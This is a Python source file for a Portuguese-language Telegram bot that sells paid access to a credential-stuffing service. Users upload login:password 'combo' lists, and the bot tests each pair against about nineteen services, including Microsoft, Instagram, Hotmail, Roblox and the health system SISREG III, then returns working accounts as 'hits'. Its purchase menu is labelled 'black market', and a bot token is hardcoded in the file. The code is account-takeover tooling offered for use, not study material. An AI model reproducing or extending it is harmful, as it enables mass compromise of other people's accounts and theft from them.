#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import asyncio
import sqlite3
import requests
import json
import base64
import random
import uuid
import time
from datetime import datetime, timedelta
from io import BytesIO
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, constants
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# Importa todos os checkers do módulo checkers (mantido separado)
from checkers import (
    check_tubehosting, check_hostini, check_hostbits, check_kinghost,
    check_boosteroid, check_joyark, check_iseek, check_instabrasil,
    check_virtual, check_hubsdev, check_crunchyroll, check_privacy,
    check_microsoft, check_roblox, check_kiwify, check_danki,
    check_sisreg, check_instagram, check_hotmail
)

# ===========================
# CONFIGURAÇÕES
# ===========================
BOT_TOKEN = "8626578331:AAFXnMq29dRnYfNqG_g6_W5yQFfUlPrDHCI"
OWNER_ID = 8523690887
SUPORTE_USER = "@gring0mdz"

# ===========================
# PLANOS (com taxa de saque incluída)
# ===========================
PLANOS = {
    "trial":   {"nome": "⏳ TESTE (3 DIAS)", "valor": 0.00, "dias": 3},
    "diario":  {"nome": "⚡ ACESSO 24H",     "valor": 17.00, "dias": 1},
    "semanal": {"nome": "🛰️ ACESSO SEMANAL", "valor": 37.00, "dias": 7},
    "mensal":  {"nome": "💎 ACESSO MENSAL",  "valor": 67.00, "dias": 30},
    "trimestral": {"nome": "🔥 ACESSO TRIMESTRAL", "valor": 117.00, "dias": 90},
    "vitalicio": {"nome": "👑 ACESSO VITALÍCIO", "valor": 342.00, "dias": 36500}
}

API_GERAR = "https://promstpagamentos.discloud.app/create_payment?user_id="
API_STATUS = "https://promstpagamentos.discloud.app/verify_payment?payment_id="

# ===========================
# BANCO DE DADOS (sem ataques)
# ===========================
def init_db():
    conn = sqlite3.connect('checker_bot.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
                    user_id INTEGER PRIMARY KEY,
                    username TEXT,
                    full_name TEXT
                )''')
    c.execute('''CREATE TABLE IF NOT EXISTS vips (
                    user_id INTEGER PRIMARY KEY,
                    expiry TEXT,
                    plan TEXT DEFAULT "diario"
                )''')
    c.execute('''CREATE TABLE IF NOT EXISTS pending_payments (
                    trans_id TEXT PRIMARY KEY,
                    user_id INTEGER,
                    dias INTEGER
                )''')
    c.execute('''CREATE TABLE IF NOT EXISTS system_config (
                    key TEXT PRIMARY KEY,
                    value TEXT
                )''')
    c.execute('''CREATE TABLE IF NOT EXISTS blacklist (
                    domain TEXT PRIMARY KEY
                )''')
    c.execute('''CREATE TABLE IF NOT EXISTS blacklist_total (
                    domain TEXT PRIMARY KEY
                )''')
    c.execute('''CREATE TABLE IF NOT EXISTS api_keys (
                    user_id INTEGER PRIMARY KEY,
                    api_key TEXT,
                    auth_ip TEXT
                )''')
    c.execute('''CREATE TABLE IF NOT EXISTS gifts (
                    code TEXT PRIMARY KEY,
                    days INTEGER,
                    plan TEXT
                )''')
    c.execute('''CREATE TABLE IF NOT EXISTS service_usage (
                    user_id INTEGER,
                    service_name TEXT,
                    count INTEGER DEFAULT 0,
                    PRIMARY KEY (user_id, service_name)
                )''')
    conn.commit()
    conn.close()

def get_user_status(uid):
    conn = sqlite3.connect('checker_bot.db')
    cur = conn.cursor()
    cur.execute("SELECT expiry, plan FROM vips WHERE user_id = ?", (uid,))
    res = cur.fetchone()
    conn.close()
    if not res: return False, "nenhum", None
    try:
        expiry = datetime.strptime(res[0], '%Y-%m-%d %H:%M:%S')
        if expiry > datetime.now():
            return True, res[1], res[0]
    except: pass
    return False, "nenhum", None

def is_vip(uid):
    vip, _, _ = get_user_status(uid)
    return vip

def add_vip_days(uid, days, plan='diario'):
    conn = sqlite3.connect('checker_bot.db')
    cur = conn.cursor()
    cur.execute("SELECT expiry FROM vips WHERE user_id = ?", (uid,))
    res = cur.fetchone()
    now = datetime.now()
    if res:
        try:
            current = datetime.strptime(res[0], '%Y-%m-%d %H:%M:%S')
            if current > now: now = current
        except: pass
    new_expiry = (now + timedelta(days=days)).strftime('%Y-%m-%d %H:%M:%S')
    cur.execute("INSERT OR REPLACE INTO vips (user_id, expiry, plan) VALUES (?, ?, ?)", (uid, new_expiry, plan))
    conn.commit()
    conn.close()

def get_config(key):
    conn = sqlite3.connect('checker_bot.db')
    cur = conn.cursor()
    cur.execute("SELECT value FROM system_config WHERE key = ?", (key,))
    res = cur.fetchone()
    conn.close()
    return res[0] if res else "off"

def set_config(key, value):
    conn = sqlite3.connect('checker_bot.db')
    cur = conn.cursor()
    cur.execute("INSERT OR REPLACE INTO system_config (key, value) VALUES (?, ?)", (key, value))
    conn.commit()
    conn.close()

def increment_service_usage(user_id, service_name):
    conn = sqlite3.connect('checker_bot.db')
    cur = conn.cursor()
    cur.execute("INSERT INTO service_usage (user_id, service_name, count) VALUES (?, ?, 1) ON CONFLICT(user_id, service_name) DO UPDATE SET count = count + 1", (user_id, service_name))
    conn.commit()
    conn.close()

def get_service_rank():
    conn = sqlite3.connect('checker_bot.db')
    cur = conn.cursor()
    # Top 10 serviços mais usados
    cur.execute("SELECT service_name, SUM(count) as total FROM service_usage GROUP BY service_name ORDER BY total DESC LIMIT 10")
    services = cur.fetchall()
    # Top 5 usuários para cada um dos top 5 serviços
    top_services = [s[0] for s in services[:5]]
    users_per_service = {}
    for svc in top_services:
        cur.execute("SELECT u.username, su.count FROM service_usage su JOIN users u ON su.user_id = u.user_id WHERE su.service_name = ? ORDER BY su.count DESC LIMIT 5", (svc,))
        users_per_service[svc] = cur.fetchall()
    conn.close()
    return services, users_per_service

# ===========================
# MAPEAMENTO DE SERVIÇOS
# ===========================
SERVICES = {
    "tubehosting": {"func": check_tubehosting, "vip": False, "name": "🌐 Tube-Hosting"},
    "hostini":     {"func": check_hostini,     "vip": True,  "name": "🏠 Hostini"},
    "hostbits":    {"func": check_hostbits,    "vip": True,  "name": "💻 Hostbits"},
    "kinghost":    {"func": check_kinghost,    "vip": True,  "name": "👑 King Host"},
    "boosteroid":  {"func": check_boosteroid,  "vip": False, "name": "🎮 Boosteroid"},
    "joyark":      {"func": check_joyark,      "vip": False, "name": "🎲 Joyark Cloud"},
    "iseek":       {"func": check_iseek,       "vip": False, "name": "👁️ ISeek Pro"},
    "instabrasil": {"func": check_instabrasil, "vip": True,  "name": "📱 InstaBrasil"},
    "virtual":     {"func": check_virtual,     "vip": True,  "name": "📞 N. Virtual"},
    "hubsdev":     {"func": check_hubsdev,     "vip": True,  "name": "🔑 HubsDev"},
    "crunchyroll": {"func": check_crunchyroll, "vip": False, "name": "🍥 Crunchyroll"},
    "privacy":     {"func": check_privacy,     "vip": True,  "name": "🔞 Privacy"},
    "microsoft":   {"func": check_microsoft,   "vip": True,  "name": "🪟 Microsoft"},
    "roblox":      {"func": check_roblox,      "vip": True,  "name": "🎮 Roblox"},
    "kiwify":      {"func": check_kiwify,      "vip": False, "name": "📚 Kiwify"},
    "danki":       {"func": check_danki,       "vip": False, "name": "💻 Danki Code"},
    "sisreg":      {"func": check_sisreg,      "vip": True,  "name": "🏥 SISREG III"},
    "instagram":   {"func": check_instagram,   "vip": True,  "name": "📸 Instagram"},
    "hotmail":     {"func": check_hotmail,     "vip": False, "name": "📧 Hotmail Inbox"},
}

# ===========================
# FUNÇÕES AUXILIARES DE FORMATAÇÃO
# ===========================
def format_message(title, body_lines):
    lines = ["━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"]
    lines.append(f"🔰 {title}")
    lines.append("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    for line in body_lines:
        lines.append(f"│ {line}")
    lines.append("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    return "\n".join(lines)

# ===========================
# COMANDOS DO BOT
# ===========================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    uid = user.id
    conn = sqlite3.connect('checker_bot.db')
    cur = conn.cursor()
    cur.execute("INSERT OR IGNORE INTO users (user_id, username, full_name) VALUES (?, ?, ?)",
                (uid, user.username, user.full_name or user.first_name))
    conn.commit()
    conn.close()
    txt = format_message("🤖 MDZ CHECKER BOT", [
        f"👤 Olá, {user.first_name}!",
        "Este bot verifica contas de diversos serviços.",
        "Use /menu para ver as opções."
    ])
    await update.message.reply_text(txt, parse_mode=constants.ParseMode.HTML)

async def menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    kb = [
        [InlineKeyboardButton("🔍 Verificar Único", callback_data="menu_single")],
        [InlineKeyboardButton("📁 Verificar Massa (.txt)", callback_data="menu_mass")],
        [InlineKeyboardButton("💳 Comprar VIP", callback_data="menu_comprar")],
        [InlineKeyboardButton("📊 Meu Status", callback_data="menu_status")],
        [InlineKeyboardButton("📋 Listar Serviços", callback_data="menu_services")],
    ]
    txt = format_message("🚀 MENU PRINCIPAL", ["Escolha uma opção:"])
    await update.message.reply_text(txt, reply_markup=InlineKeyboardMarkup(kb), parse_mode=constants.ParseMode.HTML)

async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    uid = query.from_user.id

    if data == "menu_single":
        await query.message.reply_text(
            "💡 <b>Formato:</b> <code>/check [serviço] [login] [senha]</code>\n"
            "Exemplo: <code>/check tubehosting usuario@email.com senha123</code>\n\n"
            "📌 Serviços disponíveis: use <code>/services</code>",
            parse_mode=constants.ParseMode.HTML
        )
        return

    if data == "menu_mass":
        await query.message.reply_text(
            "📁 <b>Mass Checker</b>\n"
            "Envie um arquivo .txt com combos no formato:\n"
            "<code>login:senha</code>\n"
            "e na legenda digite:\n"
            "<code>/mass [serviço]</code>\n"
            "Exemplo: <code>/mass tubehosting</code>",
            parse_mode=constants.ParseMode.HTML
        )
        return

    if data == "menu_comprar":
        if get_config("pix_system") == "off":
            await query.message.reply_text("❌ Compras temporariamente desativadas.")
            return
        kb = [
            [InlineKeyboardButton(f"⚡ 24H - R$ {PLANOS['diario']['valor']:.2f}", callback_data="buy_diario")],
            [InlineKeyboardButton(f"🛰️ Semanal - R$ {PLANOS['semanal']['valor']:.2f}", callback_data="buy_semanal")],
            [InlineKeyboardButton(f"💎 Mensal - R$ {PLANOS['mensal']['valor']:.2f}", callback_data="buy_mensal")],
            [InlineKeyboardButton(f"🔥 Trimestral - R$ {PLANOS['trimestral']['valor']:.2f}", callback_data="buy_trimestral")],
            [InlineKeyboardButton(f"👑 Vitalício - R$ {PLANOS['vitalicio']['valor']:.2f}", callback_data="buy_vitalicio")]
        ]
        txt = format_message("💳 MERCADO NEGRO", [
            "Adquira VIP e libere checkers premium.",
            "Para Trial ou problemas, contate o suporte."
        ])
        await query.message.reply_text(txt, reply_markup=InlineKeyboardMarkup(kb), parse_mode=constants.ParseMode.HTML)
        return

    if data == "menu_status":
        vip, plano, exp = get_user_status(uid)
        status_text = "✅ VIP Ativo" if vip else "❌ Grátis"
        exp_text = exp if exp else "N/A"
        txt = format_message("📊 SEU STATUS", [
            f"🆔 ID: {uid}",
            f"📦 Plano: {plano.upper()}",
            f"⏳ Expira: {exp_text}",
            f"📊 Status: {status_text}"
        ])
        await query.message.reply_text(txt, parse_mode=constants.ParseMode.HTML)
        return

    if data == "menu_services":
        # Envia a lista de serviços
        txt = "📋 <b>SERVIÇOS DISPONÍVEIS</b>\n\n"
        for key, svc in SERVICES.items():
            vip_icon = "🔒 VIP" if svc["vip"] else "🆓 FREE"
            txt += f"• <code>{key}</code> – {svc['name']} ({vip_icon})\n"
        txt += "\n💡 Use <code>/check [serviço] [login] [senha]</code>"
        await query.message.reply_text(txt, parse_mode=constants.ParseMode.HTML)
        return

    # ========== COMPRAS (PIX) ==========
    if data.startswith("buy_"):
        plano_key = data.split("_")[1]
        if plano_key == "vitalicio":
            await query.message.reply_text(f"👑 Para comprar o Vitalício, contate {SUPORTE_USER}.")
            return
        plano = PLANOS[plano_key]
        valor = plano['valor']
        try:
            url = f"{API_GERAR}{OWNER_ID}&valor={valor}"
            resp = requests.get(url, timeout=10)
            if resp.status_code != 200:
                await query.message.reply_text("❌ Erro na API de pagamento.")
                return
            data = resp.json()
            pix_code = data.get('pixCopiaECola', '')
            qr_base64 = data.get('qrcode_base64', '')
            trans_id = data.get('external_id')
            if not trans_id:
                await query.message.reply_text("❌ ID de transação não gerado.")
                return
            conn = sqlite3.connect('checker_bot.db')
            cur = conn.cursor()
            cur.execute("INSERT OR REPLACE INTO pending_payments VALUES (?, ?, ?)", (trans_id, uid, plano['dias']))
            conn.commit()
            conn.close()
            txt = format_message("💳 PAGAMENTO PIX", [
                f"📦 Plano: {plano['nome']}",
                f"💰 Valor: R$ {valor:.2f}",
                "📋 Copie o código PIX:",
                f"<code>{pix_code}</code>"
            ])
            if qr_base64:
                try:
                    if qr_base64.startswith("data:image"):
                        qr_base64 = qr_base64.split(",")[1]
                    img = BytesIO(base64.b64decode(qr_base64))
                    await query.message.reply_photo(photo=img, caption=txt, parse_mode=constants.ParseMode.HTML)
                except:
                    await query.message.reply_text(txt, parse_mode=constants.ParseMode.HTML)
            else:
                await query.message.reply_text(txt, parse_mode=constants.ParseMode.HTML)
            asyncio.create_task(check_payment_loop(context, uid, trans_id, plano['dias'], plano_key))
        except Exception as e:
            await query.message.reply_text(f"❌ Erro: {e}")

async def check_payment_loop(context, uid, trans_id, dias, plano_key):
    timeout = time.time() + 3600
    while time.time() < timeout:
        try:
            resp = requests.get(f"{API_STATUS}{trans_id}", timeout=10)
            if resp.status_code != 200:
                await asyncio.sleep(15)
                continue
            data = resp.json()
            status = data.get('status_pagamento')
            if status == "CONCLUIDA":
                add_vip_days(uid, dias, plano_key)
                conn = sqlite3.connect('checker_bot.db')
                cur = conn.cursor()
                cur.execute("DELETE FROM pending_payments WHERE trans_id = ?", (trans_id,))
                conn.commit()
                conn.close()
                await context.bot.send_message(uid, "✅ Pagamento confirmado! VIP ativado.")
                return
            elif status in ["EXPIRADA", "CANCELADA"]:
                conn = sqlite3.connect('checker_bot.db')
                cur = conn.cursor()
                cur.execute("DELETE FROM pending_payments WHERE trans_id = ?", (trans_id,))
                conn.commit()
                conn.close()
                await context.bot.send_message(uid, "❌ Pagamento expirado ou cancelado.")
                return
        except:
            pass
        await asyncio.sleep(15)
    await context.bot.send_message(uid, "❌ Tempo de pagamento esgotado.")

# ===========================
# COMANDOS DE VERIFICAÇÃO
# ===========================
async def check_single(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 3:
        await update.message.reply_text("Uso: /check [serviço] [login] [senha]")
        return
    service = context.args[0].lower()
    login = context.args[1]
    password = context.args[2]
    uid = update.effective_user.id

    if service not in SERVICES:
        await update.message.reply_text(f"❌ Serviço inválido. Use /services para ver a lista.")
        return

    if SERVICES[service]["vip"] and not is_vip(uid) and uid != OWNER_ID:
        await update.message.reply_text("❌ Este serviço é exclusivo para VIPs. Compre um plano.")
        return

    await update.message.reply_text(f"🔍 Verificando {SERVICES[service]['name']}... aguarde.")

    result = SERVICES[service]["func"](login, password)
    if result:
        success, msg, extra = result
        status = "✅ APROVADO" if success else "❌ REPROVADO"
        await update.message.reply_text(f"{status}\n{msg}")
    else:
        await update.message.reply_text("❌ Erro interno.")

    increment_service_usage(uid, service)

async def mass_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message.document:
        await update.message.reply_text("Envie um arquivo .txt com a legenda: /mass [serviço]")
        return
    if len(context.args) < 1:
        await update.message.reply_text("Use: /mass [serviço]")
        return
    service = context.args[0].lower()
    uid = update.effective_user.id

    if service not in SERVICES:
        await update.message.reply_text(f"❌ Serviço inválido. Use /services para ver a lista.")
        return

    if SERVICES[service]["vip"] and not is_vip(uid) and uid != OWNER_ID:
        await update.message.reply_text("❌ Mass checker para este serviço é VIP.")
        return

    file = await context.bot.get_file(update.message.document.file_id)
    content = await file.download_as_bytearray()
    lines = content.decode('utf-8').splitlines()
    combos = [line.strip() for line in lines if ':' in line or '|' in line]

    if not combos:
        await update.message.reply_text("❌ Nenhum combo válido encontrado.")
        return

    await update.message.reply_text(f"📁 Processando {len(combos)} combos...")

    hits = []
    for combo in combos:
        sep = ':' if ':' in combo else '|'
        parts = combo.split(sep)
        if len(parts) < 2: continue
        login, password = parts[0].strip(), parts[1].strip()
        success, msg, extra = SERVICES[service]["func"](login, password)
        if success:
            hits.append(f"{login}:{password} | {msg}")
        increment_service_usage(uid, service)
        await asyncio.sleep(0.5)

    if hits:
        output = "\n".join(hits)
        out_file = BytesIO(output.encode('utf-8'))
        out_file.name = f"hits_{service}.txt"
        await update.message.reply_document(document=out_file, caption=f"✅ {len(hits)} hits encontrados.")
    else:
        await update.message.reply_text("❌ Nenhum hit encontrado.")

# ===========================
# COMANDOS UTILITÁRIOS E ADMIN
# ===========================
async def services_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    txt = "📋 <b>SERVIÇOS DISPONÍVEIS</b>\n\n"
    for key, svc in SERVICES.items():
        vip_icon = "🔒 VIP" if svc["vip"] else "🆓 FREE"
        txt += f"• <code>{key}</code> – {svc['name']} ({vip_icon})\n"
    txt += "\n💡 Use <code>/check [serviço] [login] [senha]</code>"
    await update.message.reply_text(txt, parse_mode=constants.ParseMode.HTML)

async def gift_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ Apenas o proprietário.")
        return
    if len(context.args) < 2:
        await update.message.reply_text("Uso: /gift <dias> <plano> (ex: /gift 7 mensal)")
        return
    try:
        days = int(context.args[0])
        plan = context.args[1].lower()
        if plan not in PLANOS and plan != "vitalicio":
            await update.message.reply_text("Plano inválido.")
            return
        code = f"MDZ-{uuid.uuid4().hex[:8].upper()}"
        conn = sqlite3.connect('checker_bot.db')
        cur = conn.cursor()
        cur.execute("INSERT INTO gifts (code, days, plan) VALUES (?, ?, ?)", (code, days, plan))
        conn.commit()
        conn.close()
        link = f"https://t.me/{context.bot.username}?start=gift_{code}"
        await update.message.reply_text(
            format_message("🎁 GIFT GERADO", [
                f"📦 Código: {code}",
                f"⏳ Dias: {days}",
                f"📋 Plano: {plan}",
                f"🔗 Link de resgate: {link}",
                "Ou use: /resgatar CODIGO"
            ]), parse_mode=constants.ParseMode.HTML
        )
    except Exception as e:
        await update.message.reply_text(f"Erro: {e}")

async def resgatar_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Uso: /resgatar <código>")
        return
    code = context.args[0].upper()
    uid = update.effective_user.id
    conn = sqlite3.connect('checker_bot.db')
    cur = conn.cursor()
    cur.execute("SELECT days, plan FROM gifts WHERE code = ?", (code,))
    row = cur.fetchone()
    if not row:
        conn.close()
        await update.message.reply_text("❌ Código inválido ou já usado.")
        return
    days, plan = row
    cur.execute("DELETE FROM gifts WHERE code = ?", (code,))
    conn.commit()
    conn.close()
    add_vip_days(uid, days, plan)
    await update.message.reply_text(
        format_message("🎉 GIFT RESGATADO", [
            f"✅ Plano {plan} ativado por {days} dias!",
            f"⏳ Expira em: {(datetime.now() + timedelta(days=days)).strftime('%Y-%m-%d %H:%M:%S')}"
        ]), parse_mode=constants.ParseMode.HTML
    )

async def rank_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    services, users_per_service = get_service_rank()
    if not services:
        await update.message.reply_text("Nenhum serviço utilizado ainda.")
        return
    txt = "🏆 <b>RANK DE SERVIÇOS</b>\n\n"
    txt += "📊 <b>Top serviços (total de usos):</b>\n"
    for i, (svc, total) in enumerate(services, 1):
        txt += f"{i}. {svc} – {total} verificações\n"
    txt += "\n👤 <b>Top usuários por serviço:</b>\n"
    for svc, users in users_per_service.items():
        txt += f"\n🔹 {svc}\n"
        for uname, cnt in users:
            txt += f"   {uname or 'Sem username'} – {cnt} usos\n"
    await update.message.reply_text(txt, parse_mode=constants.ParseMode.HTML)

async def me_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    vip, plano, exp = get_user_status(uid)
    txt = format_message("👤 SEU PERFIL", [
        f"🆔 ID: {uid}",
        f"📦 Plano: {plano.upper()}",
        f"⏳ Expira: {exp if exp else 'N/A'}",
        f"📊 VIP: {'✅ Ativo' if vip else '❌ Inativo'}"
    ])
    await update.message.reply_text(txt, parse_mode=constants.ParseMode.HTML)

async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    import psutil
    cpu = psutil.cpu_percent()
    ram = psutil.virtual_memory().percent
    uptime = str(timedelta(seconds=int(time.time() - bot_start_time)))
    txt = format_message("📊 ESTATÍSTICAS DO BOT", [
        f"💻 CPU: {cpu}%",
        f"🧠 RAM: {ram}%",
        f"⏱️ Uptime: {uptime}"
    ])
    await update.message.reply_text(txt, parse_mode=constants.ParseMode.HTML)

# ===========================
# COMANDOS ADMIN (simples)
# ===========================
async def admin_tools(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ Acesso restrito ao proprietário.")
        return
    cmd = update.message.text.split()
    if not cmd:
        await update.message.reply_text("Comando vazio.")
        return
    action = cmd[0].lower()

    if action == "/setpic":
        if update.message.reply_to_message and update.message.reply_to_message.photo:
            file_id = update.message.reply_to_message.photo[-1].file_id
            set_config("menu_photo", file_id)
            await update.message.reply_text("✅ Foto do menu configurada.")
        elif len(cmd) > 1 and cmd[1].lower() == "off":
            set_config("menu_photo", "off")
            await update.message.reply_text("✅ Foto do menu desativada.")
        else:
            await update.message.reply_text("💡 Use /setpic respondendo a uma foto, ou /setpic off")
    elif action == "/free" and len(cmd) > 1:
        if cmd[1].lower() in ["on", "off"]:
            set_config("free_plan", cmd[1].lower())
            await update.message.reply_text(f"✅ Plano gratuito: {cmd[1].upper()}")
        else:
            await update.message.reply_text("Use /free on ou /free off")
    elif action == "/manutencao" and len(cmd) > 1:
        if cmd[1].lower() in ["on", "off"]:
            set_config("maintenance", cmd[1].lower())
            await update.message.reply_text(f"✅ Modo manutenção: {cmd[1].upper()}")
        else:
            await update.message.reply_text("Use /manutencao on ou /manutencao off")
    else:
        await update.message.reply_text("Comando admin desconhecido.")

# ===========================
# MAIN
# ===========================
bot_start_time = time.time()

def main():
    init_db()
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("menu", menu))
    app.add_handler(CommandHandler("check", check_single))
    app.add_handler(CommandHandler("mass", mass_check))
    app.add_handler(CommandHandler("services", services_cmd))
    app.add_handler(CommandHandler("gift", gift_cmd))
    app.add_handler(CommandHandler("resgatar", resgatar_cmd))
    app.add_handler(CommandHandler("rank", rank_cmd))
    app.add_handler(CommandHandler("me", me_cmd))
    app.add_handler(CommandHandler("status", status_cmd))

    # Admin commands
    for cmd in ["setpic", "free", "manutencao"]:
        app.add_handler(CommandHandler(cmd, admin_tools))

    app.add_handler(CallbackQueryHandler(handle_callback))

    print("🤖 MDZ Checker Bot está online!")
    app.run_polling()

if __name__ == "__main__":
    main()
